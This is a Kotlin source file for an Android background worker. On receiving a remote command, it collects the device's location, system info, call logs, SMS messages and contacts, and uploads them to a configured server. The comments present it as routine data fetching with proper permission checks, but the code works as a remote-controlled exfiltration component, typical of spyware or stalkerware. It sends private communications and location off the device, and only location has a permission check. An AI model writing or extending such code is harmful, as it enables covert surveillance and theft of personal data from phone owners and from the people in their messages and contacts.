package com.example.lta

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log
import androidx.core.content.ContextCompat
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.tasks.await
import kotlinx.coroutines.withContext
import java.io.File

/**
 * Background worker that handles various data fetching operations including:
 * - Location tracking
 * - System information collection
 * - CSV exports of call logs, SMS, and contacts
 * 
 * All operations are performed with proper permission checks and error handling.
 */
class DataFetchWorker(
    private val appContext: Context, 
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    companion object {
        const val KEY_COMMAND = "COMMAND"
        private const val TAG = "DataFetchWorker"
        
        // Command constants for better type safety
        private const val COMMAND_GET_LOCATION = "get_location"
        private const val COMMAND_GET_SYSTEM_INFO = "get_system_info"
        private const val COMMAND_GET_CALL_LOGS = "get_call_logs"
        private const val COMMAND_GET_SMS = "get_sms"
        private const val COMMAND_GET_CONTACTS = "get_contacts"
        
        // Minimum CSV lines to consider valid data (header + at least one row)
        private const val MIN_CSV_LINES = 2
    }

    // Lazy initialization to avoid unnecessary object creation
    private val apiClient by lazy { 
        ApiClient(appContext.getString(R.string.server_base_url)) 
    }
    private val manualDataManager by lazy { 
        ManualDataManager(appContext) 
    }
    private val systemInfoManager by lazy { 
        SystemInfoManager(appContext) 
    }

    /**
     * Main worker execution method that dispatches commands to appropriate handlers
     */
    override suspend fun doWork(): Result {
        val command = inputData.getString(KEY_COMMAND)
        if (command.isNullOrBlank()) {
            Log.e(TAG, "Worker started without a valid command")
            return Result.failure()
        }
        
        Log.d(TAG, "Executing command: $command")

        return withContext(Dispatchers.IO) {
            try {
                val success = executeCommand(command)
                if (success) {
                    Log.d(TAG, "Command '$command' executed successfully")
                    Result.success()
                } else {
                    Log.w(TAG, "Command '$command' failed, will retry")
                    Result.retry()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Error executing command '$command'", e)
                Result.failure()
            }
        }
    }

    /**
     * Executes the appropriate command based on input
     */
    private suspend fun executeCommand(command: String): Boolean {
        return when (command) {
            COMMAND_GET_LOCATION -> fetchAndSendLocation()
            COMMAND_GET_SYSTEM_INFO -> fetchAndSendSystemInfo()
            COMMAND_GET_CALL_LOGS -> fetchAndSendCsv(
                dataType = "CallLogs",
                csvProvider = manualDataManager::getCallLogsAsCsv
            )
            COMMAND_GET_SMS -> fetchAndSendCsv(
                dataType = "SMS", 
                csvProvider = manualDataManager::getSmsAsCsv
            )
            COMMAND_GET_CONTACTS -> fetchAndSendCsv(
                dataType = "Contacts",
                csvProvider = manualDataManager::getContactsAsCsv
            )
            else -> {
                Log.w(TAG, "Unknown command: $command")
                apiClient.uploadText("❌ Error: Unknown command '$command'")
                false
            }
        }
    }

    /**
     * Fetches current location and sends it to the server
     * Requires ACCESS_FINE_LOCATION permission
     */
    private suspend fun fetchAndSendLocation(): Boolean {
        return try {
            if (!hasLocationPermission()) {
                Log.e(TAG, "Location permission not granted")
                return apiClient.uploadText("❌ Location command failed: Permission not granted")
            }

            val location = getCurrentLocation()
            if (location != null) {
                val message = buildString {
                    appendLine("📍 Location Update:")
                    appendLine("Latitude: ${location.latitude}")
                    appendLine("Longitude: ${location.longitude}")
                    appendLine("Accuracy: ${location.accuracy}m")
                    if (location.hasAltitude()) {
                        appendLine("Altitude: ${location.altitude}m")
                    }
                    appendLine("Timestamp: ${System.currentTimeMillis()}")
                }
                apiClient.uploadText(message.trim())
            } else {
                Log.w(TAG, "Failed to obtain location - received null")
                apiClient.uploadText("📍 Location Update: Failed to get location (location was null)")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error fetching location", e)
            apiClient.uploadText("📍 Location Update: Error occurred - ${e.message}")
            false
        }
    }

    /**
     * Checks if the app has fine location permission
     */
    private fun hasLocationPermission(): Boolean {
        return ContextCompat.checkSelfPermission(
            appContext, 
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
    }

    /**
     * Gets current location using FusedLocationProvider
     */
    private suspend fun getCurrentLocation(): android.location.Location? {
        val fusedLocationClient = LocationServices.getFusedLocationProviderClient(appContext)
        return try {
            fusedLocationClient.getCurrentLocation(
                Priority.PRIORITY_BALANCED_POWER_ACCURACY, 
                null
            ).await()
        } catch (e: Exception) {
            Log.e(TAG, "Exception getting current location", e)
            null
        }
    }

    /**
     * Fetches system information (network and battery) and sends to server
     */
    private suspend fun fetchAndSendSystemInfo(): Boolean {
        return try {
            val networkInfo = systemInfoManager.getNetworkInfo()
            val batteryInfo = systemInfoManager.getBatteryInfo()
            
            val systemInfoMessage = buildString {
                appendLine("⚙️ System Info:")
                appendLine("Network: $networkInfo")
                append(batteryInfo)
            }
            
            apiClient.uploadText(systemInfoMessage)
        } catch (e: Exception) {
            Log.e(TAG, "Error fetching system info", e)
            apiClient.uploadText("⚙️ System Info: Error occurred - ${e.message}")
            false
        }
    }

    /**
     * Generic method to fetch CSV data and upload as file
     * @param dataType Human-readable name for the data type
     * @param csvProvider Function that returns CSV data as string
     */
    private suspend fun fetchAndSendCsv(
        dataType: String, 
        csvProvider: suspend () -> String
    ): Boolean {
        return try {
            Log.d(TAG, "Fetching $dataType data")
            val csvData = csvProvider()
            
            // Check if CSV has meaningful data (more than just header)
            val lineCount = csvData.lines().size
            if (lineCount < MIN_CSV_LINES) {
                Log.d(TAG, "No meaningful data to export for $dataType (only $lineCount lines)")
                return apiClient.uploadText("📊 $dataType export: No data found to export")
            }

            // Create temporary file for CSV data
            val tempFile = createTempCsvFile(dataType, csvData)
            
            return try {
                val success = apiClient.uploadFile(
                    file = tempFile, 
                    description = "📊 Exported $dataType from device (${lineCount - 1} records)"
                )
                if (success) {
                    Log.d(TAG, "Successfully uploaded $dataType CSV with ${lineCount - 1} records")
                } else {
                    Log.w(TAG, "Failed to upload $dataType CSV file")
                }
                success
            } finally {
                // Always clean up temporary file
                if (tempFile.exists()) {
                    tempFile.delete()
                    Log.d(TAG, "Cleaned up temporary file: ${tempFile.name}")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error processing $dataType CSV", e)
            apiClient.uploadText("📊 $dataType export failed: ${e.message}")
            false
        }
    }

    /**
     * Creates a temporary CSV file with the provided data
     */
    private suspend fun createTempCsvFile(dataType: String, csvData: String): File {
        return withContext(Dispatchers.IO) {
            val fileName = "${dataType.lowercase()}_${System.currentTimeMillis()}"
            val tempFile = File.createTempFile(fileName, ".csv", appContext.cacheDir)
            tempFile.writeText(csvData)
            Log.d(TAG, "Created temporary CSV file: ${tempFile.name} (${tempFile.length()} bytes)")
            tempFile
        }
    }
}
